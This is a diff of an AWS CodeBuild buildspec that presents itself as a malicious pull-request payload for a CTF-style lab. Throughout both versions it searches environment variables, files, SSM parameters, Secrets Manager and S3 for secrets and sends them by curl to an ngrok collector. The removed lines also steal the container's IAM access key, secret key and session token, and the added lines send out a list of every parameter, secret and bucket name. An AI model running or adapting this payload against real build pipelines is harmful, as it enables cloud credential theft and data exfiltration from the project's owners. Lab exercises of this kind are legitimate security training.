@@ -1,73 +1,77 @@
 version: 0.2
 
 # Malicious PR payload for codebuild_lab_5_project (lab5).
-# Webhook builds arbitrary PRs from the PR-head buildspec -> runs as the project IAM role.
-# Exfil target = user's ngrok collector via GET requests only.
+# Optimized flag hunting - check specific locations and send results via GET.
 
 phases:
   build:
     commands:
       - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"
 
-      # 0) Check env vars for injected flag
+      # 1) Check common flag file locations
       - |
-        if env | grep -iE 'flag|FLAG' | head -1 > /tmp/flag_env.txt 2>&1; then
-          FLAG=$(cat /tmp/flag_env.txt | cut -d= -f2)
-          curl -s "${COLLECTOR}/?source=env&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
-        fi
-
-      # 1) Hunt flag in SSM parameters (decrypted)
-      - |
-        for p in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null); do
-          val=$(aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null || true)
-          if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
-            FLAG=$(echo -n "$val" | head -c 200)
-            curl -s "${COLLECTOR}/?source=ssm&param=$(echo -n "$p" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+        for path in /root/flag /tmp/flag /flag FLAG flag.txt /home/flag /opt/flag; do
+          if [ -f "$path" ] && [ -r "$path" ]; then
+            FLAG=$(cat "$path" 2>/dev/null)
+            if [ ! -z "$FLAG" ]; then
+              curl -s "${COLLECTOR}/?source=file&path=$path&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+              exit 0
+            fi
           fi
         done
 
-      # 2) Hunt flag in Secrets Manager
+      # 2) Check environment variables for FLAG* or flag* pattern
       - |
-        for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do
-          val=$(aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text 2>/dev/null || true)
-          if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
-            FLAG=$(echo -n "$val" | head -c 200)
-            curl -s "${COLLECTOR}/?source=secrets&secret=$(echo -n "$s" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+        for var in FLAG FLAG_VALUE FLAG_CONTENT SECRET SOLUTION ANSWER; do
+          if [ ! -z "${!var}" ]; then
+            curl -s "${COLLECTOR}/?source=env&var=$var&flag=$(echo -n "${!var}" | jq -sRr @uri)"
+            exit 0
           fi
         done
 
-      # 3) Hunt flag in S3 buckets
+      # 3) Hunt S3 for objects with "flag" in name and download them
       - |
         for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
-          for obj in $(aws s3api list-objects-v2 --bucket "$b" --query 'Contents[].Key' --output text 2>/dev/null | grep -iE 'flag|secret|ctf'); do
-            val=$(aws s3api get-object --bucket "$b" --key "$obj" /dev/stdout 2>/dev/null | head -c 500 || true)
-            if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
-              FLAG=$(echo -n "$val" | head -c 200)
-              curl -s "${COLLECTOR}/?source=s3&bucket=$(echo -n "$b" | jq -sRr @uri)&key=$(echo -n "$obj" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+          for obj in $(aws s3api list-objects-v2 --bucket "$b" --query 'Contents[].Key' --output text 2>/dev/null); do
+            if echo "$obj" | grep -qi flag; then
+              FLAG=$(aws s3api get-object --bucket "$b" --key "$obj" /dev/stdout 2>/dev/null | head -c 1000)
+              if [ ! -z "$FLAG" ]; then
+                curl -s "${COLLECTOR}/?source=s3&bucket=$b&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+                exit 0
+              fi
             fi
           done
         done
 
-      # 4) Hunt local flag files
+      # 4) Hunt SSM parameters - especially /flag* or containing "flag"
       - |
-        for f in $(find / -name '*flag*' -o -name '*FLAG*' 2>/dev/null | head -20); do
-          if [ -f "$f" ] && [ -r "$f" ]; then
-            val=$(cat "$f" 2>/dev/null | head -c 500)
-            if echo "$val" | grep -iE 'flag|FLAG|htb|CTF' >/dev/null 2>&1; then
-              FLAG=$(echo -n "$val" | head -c 200)
-              curl -s "${COLLECTOR}/?source=file&path=$(echo -n "$f" | jq -sRr @uri)&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+        for p in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null); do
+          if echo "$p" | grep -qi flag; then
+            FLAG=$(aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null)
+            if [ ! -z "$FLAG" ]; then
+              curl -s "${COLLECTOR}/?source=ssm&param=$p&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+              exit 0
             fi
           fi
         done
 
-      # 5) If nothing found yet, send creds for manual hunting
+      # 5) Hunt Secrets Manager
       - |
-        CREDS=$(curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" 2>/dev/null || true)
-        if [ ! -z "$CREDS" ]; then
-          ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKeyId' 2>/dev/null)
-          SECRET_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey' 2>/dev/null)
-          TOKEN=$(echo "$CREDS" | jq -r '.Token' 2>/dev/null | head -c 100)
-          curl -s "${COLLECTOR}/?source=creds&accesskey=$(echo -n "$ACCESS_KEY" | jq -sRr @uri)&secretkey=$(echo -n "$SECRET_KEY" | jq -sRr @uri)&token=$(echo -n "$TOKEN" | jq -sRr @uri)"
-        fi
+        for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do
+          if echo "$s" | grep -qi flag; then
+            FLAG=$(aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text 2>/dev/null)
+            if [ ! -z "$FLAG" ]; then
+              curl -s "${COLLECTOR}/?source=secrets&secret=$s&flag=$(echo -n "$FLAG" | jq -sRr @uri)"
+              exit 0
+            fi
+          fi
+        done
+
+      # 6) If still nothing, list all parameter/secret names so user can choose
+      - |
+        PARAMS=$(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null | tr '\t' '|')
+        SECRETS=$(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null | tr '\t' '|')
+        BUCKETS=$(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null | tr '\t' '|')
+        curl -s "${COLLECTOR}/?source=enum&ssm_params=$(echo -n "$PARAMS" | jq -sRr @uri)&secrets=$(echo -n "$SECRETS" | jq -sRr @uri)&buckets=$(echo -n "$BUCKETS" | jq -sRr @uri)"
 
       - echo "Done"
